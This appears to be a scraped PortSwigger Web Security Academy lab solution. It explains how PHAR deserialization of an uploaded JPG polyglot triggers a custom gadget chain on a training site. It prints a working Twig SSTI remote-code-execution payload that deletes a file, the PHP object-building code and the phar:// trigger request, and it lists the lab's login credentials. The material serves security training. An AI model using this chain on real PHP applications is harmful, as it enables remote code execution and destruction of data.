## Using PHAR deserialization to deploy a custom gadget chain

**Category:** deserialization
**Difficulty:** Unknown

### Description
This lab does not explicitly use deserialization. However, if you combinePHARdeserialization with other advanced hacking techniques, you can still achieve remote code execution via a custom gadget chain.

### Solution Steps
1. Observe that the website has a feature for uploading your own avatar, which only accepts JPG images. Upload a valid JPG as your avatar. Notice that it is loaded using GET /cgi-bin/avatar.php?avatar=wiener .
2. In Burp Repeater, request GET /cgi-bin to find an index that shows a Blog.php and CustomTemplate.php file. Obtain the source code by requesting the files using the .php~ backup extension.
3. Study the source code and identify the gadget chain involving the Blog->desc and CustomTemplate->lockFilePath attributes.
4. Notice that the file_exists() filesystem method is called on the lockFilePath attribute.
5. Notice that the website uses the Twig template engine. You can use deserialization to pass in an server-side template injection (SSTI) payload. Find a documented SSTI payload for remote code execution on Twig, and adapt it to delete Carlos's file: {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}
6. Write a some PHP for creating a CustomTemplate and Blog containing your SSTI payload: class CustomTemplate {}
class Blog {}
$object = new CustomTemplate;
$blog = new Blog;
$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
$blog->user = 'user';
$object->template_file_path = $blog;
7. Create a PHAR-JPG polyglot containing your PHP script. You can find several scripts for doing this online (search for " phar jpg polyglot "). Alternatively, you can download our ready-made one .
8. Upload this file as your avatar.
9. In Burp Repeater, modify the request line to deserialize your malicious avatar using a phar:// stream as follows: GET /cgi-bin/avatar.php?avatar=phar://wiener
10. Send the request to solve the lab.

### Key Payloads
- `PHAR`
- `morale.txt`
- `wiener:peter`
- `GET /cgi-bin/avatar.php?avatar=wiener`
- `GET /cgi-bin`
- `Blog.php`
- `CustomTemplate.php`
- `.php~`
- `Blog->desc`
- `CustomTemplate->lockFilePath`

### Indicators of Success
- Serialized payload processed without error
- Code execution via gadget chain
- File created/deleted on server
- Out-of-band callback received
- Server behavior indicates deserialization
---
*Source: PortSwigger Web Security Academy*
